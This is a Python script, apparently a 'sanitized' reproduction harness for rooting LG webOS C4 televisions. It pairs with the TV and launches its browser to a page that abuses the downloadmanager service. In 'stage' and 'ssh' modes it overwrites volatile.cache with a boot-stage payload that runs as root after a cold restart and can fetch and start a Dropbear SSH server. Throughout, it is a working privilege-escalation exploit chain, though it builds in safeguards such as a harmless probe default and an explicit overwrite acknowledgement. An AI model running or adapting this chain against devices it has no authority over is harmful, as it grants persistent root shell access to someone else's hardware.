#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Sanitized C4 reproduction harness: tinybrowser -> downloadmanager -> boot stage.

Default mode writes a uniquely named harmless probe. Stage/SSH modes replace
volatile.cache and require explicit acknowledgement and a manual cold restart.
The historical device result does not constitute runtime testing of this rewrite.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import ipaddress
import json
import os
import re
import secrets
import shlex
import struct
import threading
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

from webos_ssap import SSAPClient, SSAPError, WebSocket

ROOT = Path(__file__).resolve().parent.parent
TARGET_DIR = '/mnt/lg/cmn_data/var/cache'
MAX_PAYLOAD = 256 * 1024
MAX_REPORT = 16 * 1024
MANIFEST = {
    'manifestVersion': 1, 'appVersion': '1.0',
    'appId': 'org.local.lgwebosc4root', 'vendorId': 'lg-webos-c4-root',
    'localizedAppNames': {'': 'LG webOS C4 root research'},
    'permissions': ['LAUNCH', 'CLOSE', 'READ_APP_STATUS', 'READ_INSTALLED_APPS', 'READ_RUNNING_APPS'],
}
PAGE = r'''<!doctype html><meta charset="utf-8"><title>C4 root research</title>
<pre id="out">Waiting for downloadmanager…</pre><script>
(function(){
 var out=document.getElementById('out'), keep=[], replied=false;
 function report(kind,data){out.textContent+='\n'+kind+': '+data;
  var request=new XMLHttpRequest();request.open('POST',__REPORT__,true);
  request.setRequestHeader('Content-Type','application/json');
  request.send(JSON.stringify({kind:kind,data:data}));}
 var Bridge=window.webOSServiceBridge||window.WebOSServiceBridge||window.PalmServiceBridge;
 if(typeof Bridge!=='function'){report('DOWNLOAD_FAILED','Service bridge unavailable');return;}
 var bridge=new Bridge();keep.push(bridge);
 bridge.onservicecallback=function(raw){if(replied)return;replied=true;
  try{var result=JSON.parse(raw);report(result&&result.returnValue===true?'DOWNLOAD_ACCEPTED':'DOWNLOAD_FAILED',raw);}
  catch(error){report('DOWNLOAD_FAILED',String(raw));}};
 bridge.call('luna://com.webos.service.downloadmanager/download',JSON.stringify(__REQUEST__));
 if(window.PalmSystem&&PalmSystem.stageReady)PalmSystem.stageReady();
})();</script>'''


def ipv4(value: str) -> str:
    try:
        address = ipaddress.IPv4Address(value)
    except ipaddress.AddressValueError as error:
        raise argparse.ArgumentTypeError('Use an explicit IPv4 address') from error
    if address.is_unspecified or address.is_multicast or address.is_loopback:
        raise argparse.ArgumentTypeError('Use the actual LAN address, not loopback or wildcard')
    return str(address)


def port(value: str) -> int:
    number = int(value)
    if not 1024 <= number <= 65535:
        raise argparse.ArgumentTypeError('Use a port from 1024 to 65535')
    return number


def read_public_key(path: Path) -> str:
    text = path.read_text(encoding='ascii').strip()
    if '\n' in text or '\r' in text or len(text) > 4096:
        raise ValueError('Supply one OpenSSH Ed25519 public key, never a private key')
    parts = text.split()
    if len(parts) < 2 or parts[0] != 'ssh-ed25519':
        raise ValueError('Expected an ssh-ed25519 public key')
    raw = base64.b64decode(parts[1], validate=True)
    algorithm = b'ssh-ed25519'
    expected = struct.pack('!I', len(algorithm)) + algorithm + struct.pack('!I', 32)
    if not raw.startswith(expected) or len(raw) != len(expected) + 32:
        raise ValueError('Malformed Ed25519 public key')
    return 'ssh-ed25519 ' + parts[1]


def bounded_file(path: Path, maximum: int) -> bytes:
    if path.stat().st_size > maximum:
        raise ValueError(f'File exceeds the {maximum}-byte limit')
    return path.read_bytes()


@dataclass
class Run:
    tv: str
    local_ip: str
    port: int
    mode: str = 'probe'
    run_id: str = field(default_factory=lambda: secrets.token_hex(8))
    token: str = field(default_factory=lambda: secrets.token_hex(32), repr=False)
    ssh_port: int = 2222
    public_key: str = ''
    dropbear: bytes = b''
    restore: bytes | None = None
    events: list[dict] = field(default_factory=list, repr=False)
    done: threading.Event = field(default_factory=threading.Event, repr=False)
    callback_result: str | None = None

    @property
    def prefix(self) -> str:
        return '/run/' + self.token

    def url(self, name: str) -> str:
        return f'http://{self.local_ip}:{self.port}{self.prefix}/{name}'

    @property
    def filename(self) -> str:
        return f'lg-root-probe-{self.run_id}.txt' if self.mode == 'probe' else 'volatile.cache'

    @property
    def download_request(self) -> dict:
        return {'target': self.url('payload'), 'targetDir': TARGET_DIR,
                'targetFilename': self.filename, 'appendTargetFile': False}

    def payload(self, *, cache_dir: str = TARGET_DIR, home_dir: str = '/home/root',
                compat_ssh_dir: str = '/var/lib/webosbrew/sshd') -> bytes:
        if self.mode == 'probe':
            return f'LG_WEBOS_C4_PROBE {self.run_id}\n'.encode()
        signature = 'LG_C4_ROOT_STAGE_' + self.run_id
        settings = {
            'MODE': self.mode, 'RUN_ID': self.run_id, 'SIGNATURE': signature,
            'CACHE_FILE': cache_dir + '/volatile.cache',
            'PROOF_FILE': cache_dir + '/lg-root-proof-' + self.run_id,
            'HOME_DIR': home_dir, 'RESULT_URL': self.url('result'),
            'COMPAT_SSH_DIR': compat_ssh_dir,
            'RESTORE_URL': self.url('restore') if self.restore is not None else '',
            'RESTORE_SHA256': hashlib.sha256(self.restore).hexdigest() if self.restore is not None else '',
            'DROPBEAR_URL': self.url('dropbear') if self.mode == 'ssh' else '',
            'DROPBEAR_SHA256': hashlib.sha256(self.dropbear).hexdigest() if self.dropbear else '',
            'PUBLIC_KEY': self.public_key, 'SSH_PORT': str(self.ssh_port),
            'SSH_PID_FILE': cache_dir + '/lg-root-ssh.pid',
            'SSH_LOG_FILE': cache_dir + '/lg-root-ssh.log',
        }
        config = '\n'.join(key + '=' + shlex.quote(value) for key, value in settings.items())
        template = (ROOT / 'payloads/boot-stage.sh').read_text(encoding='utf-8')
        payload = template.replace('{{CONFIG}}', config).encode()
        if len(payload) > MAX_PAYLOAD:
            raise ValueError('Rendered boot payload is too large')
        return payload

    def page(self) -> bytes:
        return PAGE.replace('__REPORT__', json.dumps(self.prefix + '/report')).replace(
            '__REQUEST__', json.dumps(self.download_request)).encode()

    def accept_report(self, endpoint: str, body: bytes) -> None:
        if endpoint == 'report':
            event = json.loads(body)
            if not isinstance(event, dict) or event.get('kind') not in {'DOWNLOAD_ACCEPTED', 'DOWNLOAD_FAILED'}:
                raise ValueError('Invalid download report')
            # Preserve only the status. The TV's raw service reply is not logged/published.
            kind = event['kind']
            self.events.append({'kind': kind})
            print(kind, flush=True)
            if kind == 'DOWNLOAD_FAILED' or self.mode == 'probe':
                self.callback_result = kind
                self.done.set()
            return
        message = body.decode('utf-8', errors='strict').strip()
        allowed = ('BOOT_ROOT_OK uid=0(root)', 'BOOT_NOT_ROOT', 'CACHE_IDENTITY_MISMATCH',
                   'CACHE_RESTORE_FAILED', 'CACHE_ISOLATION_FAILED', 'SSH_BINARY_FAILED')
        if message not in allowed and not re.fullmatch(r'SSH_PROCESS_(?:STARTED port=\d+|FAILED rc=\d+)', message):
            raise ValueError('Invalid boot report')
        self.events.append({'kind': message})
        print(message, flush=True)
        if (self.mode == 'stage' and message == allowed[0]) or message != allowed[0]:
            self.callback_result = message
            self.done.set()


def make_handler(run: Run):
    class Handler(BaseHTTPRequestHandler):
        def setup(self) -> None:
            super().setup()
            self.connection.settimeout(10)

        def endpoint(self) -> str | None:
            # Both an exact peer-IP check and an unguessable run path are required.
            if self.client_address[0] != run.tv:
                return None
            parsed = urlsplit(self.path)
            pieces = parsed.path.split('/')
            if parsed.query or len(pieces) != 4 or pieces[1] != 'run':
                return None
            if not hmac.compare_digest(pieces[2], run.token):
                return None
            return pieces[3]

        def send(self, code: int, body: bytes = b'', mime: str = 'text/plain; charset=utf-8') -> None:
            self.send_response(code)
            self.send_header('Content-Type', mime)
            self.send_header('Content-Length', str(len(body)))
            self.send_header('Cache-Control', 'no-store')
            self.send_header('X-Content-Type-Options', 'nosniff')
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self) -> None:
            endpoint = self.endpoint()
            if endpoint is None:
                self.send(403)
            elif endpoint == 'page':
                self.send(200, run.page(), 'text/html; charset=utf-8')
            elif endpoint == 'payload':
                self.send(200, run.payload())
            elif endpoint == 'dropbear' and run.mode == 'ssh':
                self.send(200, run.dropbear, 'application/octet-stream')
            elif endpoint == 'restore' and run.restore is not None:
                self.send(200, run.restore, 'application/octet-stream')
            else:
                self.send(404)

        def do_POST(self) -> None:
            endpoint = self.endpoint()
            if endpoint not in {'report', 'result'}:
                self.send(403)
                return
            try:
                length = int(self.headers.get('Content-Length', '-1'))
                if not 0 <= length <= MAX_REPORT:
                    self.send(413)
                    return
                run.accept_report(endpoint, self.rfile.read(length))
            except (ValueError, UnicodeError, json.JSONDecodeError):
                self.send(400)
                return
            self.send(204)

        def log_message(self, *_args: object) -> None:
            # Never write token-bearing request URLs to access logs.
            pass
    return Handler


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    result.add_argument('--tv', type=ipv4, required=True)
    result.add_argument('--local-ip', type=ipv4, required=True)
    result.add_argument('--port', type=port, default=8081)
    result.add_argument('--mode', choices=['probe', 'stage', 'ssh'], default='probe')
    result.add_argument('--key-file', type=Path, default=Path('.local/webos-client-key'))
    result.add_argument('--pair', action='store_true', help='Request pairing if no saved client key exists')
    result.add_argument('--timeout', type=float, default=600,
                        help='Total wait budget including manual power-cycle (default: 600 seconds)')
    result.add_argument('--acknowledge-cache-overwrite', action='store_true',
                        help='Required for stage/ssh: existing volatile.cache may be replaced')
    result.add_argument('--restore-cache', type=Path, help='Optional pre-existing original cache backup to restore')
    result.add_argument('--ssh-pubkey', type=Path, help='Your own OpenSSH Ed25519 public key file')
    result.add_argument('--dropbear', type=Path, help='Your own compatible Dropbear server ELF; not included')
    result.add_argument('--ssh-port', type=port, default=2222)
    result.add_argument('--dry-run', action='store_true', help='Build/validate locally; no server, pairing or TV request')
    return result


def prepare(args: argparse.Namespace) -> Run:
    if not 1 <= args.timeout <= 3600:
        raise ValueError('Timeout must be between 1 and 3600 seconds')
    if args.mode != 'probe' and not args.acknowledge_cache_overwrite:
        raise ValueError('stage/ssh requires --acknowledge-cache-overwrite')
    if args.mode == 'probe' and args.restore_cache:
        raise ValueError('--restore-cache is only meaningful with stage/ssh')
    if args.mode != 'ssh' and (args.ssh_pubkey or args.dropbear):
        raise ValueError('SSH inputs require --mode ssh')
    run = Run(args.tv, args.local_ip, args.port, args.mode, ssh_port=args.ssh_port)
    if args.restore_cache:
        run.restore = bounded_file(args.restore_cache, MAX_PAYLOAD)
    if args.mode == 'ssh':
        if not args.ssh_pubkey or not args.dropbear:
            raise ValueError('ssh requires --ssh-pubkey and --dropbear')
        run.public_key = read_public_key(args.ssh_pubkey)
        run.dropbear = bounded_file(args.dropbear, 16 * 1024 * 1024)
        if not run.dropbear.startswith(b'\x7fELF'):
            raise ValueError('Expected a compatible Dropbear ELF server binary')
    return run


def main(argv: list[str] | None = None) -> int:
    cli = parser()
    args = cli.parse_args(argv)
    try:
        run = prepare(args)
        payload = run.payload()
    except (OSError, ValueError) as error:
        cli.error(str(error))
    print(json.dumps({'mode': run.mode, 'targetDir': TARGET_DIR, 'targetFilename': run.filename,
                      'payloadSha256': hashlib.sha256(payload).hexdigest(), 'dryRun': args.dry_run}), flush=True)
    if args.dry_run:
        return 0
    key = args.key_file.read_text(encoding='utf-8').strip() if args.key_file.exists() else ''
    if not key and not args.pair:
        cli.error('No saved pairing key. Use --pair and approve on the TV, or supply --key-file.')
    server = ThreadingHTTPServer((run.local_ip, run.port), make_handler(run))
    server.daemon_threads = True
    server.timeout = 5
    threading.Thread(target=server.serve_forever, daemon=True).start()
    client = None
    try:
        client = SSAPClient(WebSocket.connect(run.tv, 3001, secure=True))
        new_key = client.register(key, MANIFEST, timeout=90)
        if new_key and new_key != key:
            args.key_file.parent.mkdir(parents=True, exist_ok=True)
            descriptor = os.open(args.key_file, os.O_CREAT | os.O_TRUNC | os.O_WRONLY, 0o600)
            with os.fdopen(descriptor, 'w', encoding='utf-8') as stream:
                stream.write(new_key)
            os.chmod(args.key_file, 0o600)
        response = client.request('ssap://system.launcher/launch', {
            'id': 'com.webos.app.tinybrowser', 'params': {'contentTarget': run.url('page')}})
        if response.get('type') == 'error' or response.get('payload', {}).get('returnValue') is False:
            raise SSAPError('TV rejected tinybrowser launch')
        print('Waiting for download report. Download acceptance is not proof of root.', flush=True)
        if run.mode != 'probe':
            print('After DOWNLOAD_ACCEPTED, fully power-cycle manually; standby is not a cold boot.', flush=True)
        run.done.wait(args.timeout)
        result = run.callback_result
        success = (run.mode == 'probe' and result == 'DOWNLOAD_ACCEPTED') or (
            run.mode == 'stage' and result == 'BOOT_ROOT_OK uid=0(root)') or (
            run.mode == 'ssh' and result == f'SSH_PROCESS_STARTED port={run.ssh_port}')
        if success and run.mode == 'ssh':
            print('SSH process launch reported. Verify a NEW SSH connection and id yourself; not yet verified.', flush=True)
        if not success:
            print('No successful final callback. Inspect the TV state before staging again.', flush=True)
        return 0 if success else 1
    except (SSAPError, OSError, ValueError) as error:
        # Do not log arbitrary transport responses or token-bearing URLs.
        print(f'Flow failed ({type(error).__name__}). No success claimed.', flush=True)
        return 1
    finally:
        if client is not None:
            client.close()
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    raise SystemExit(main())
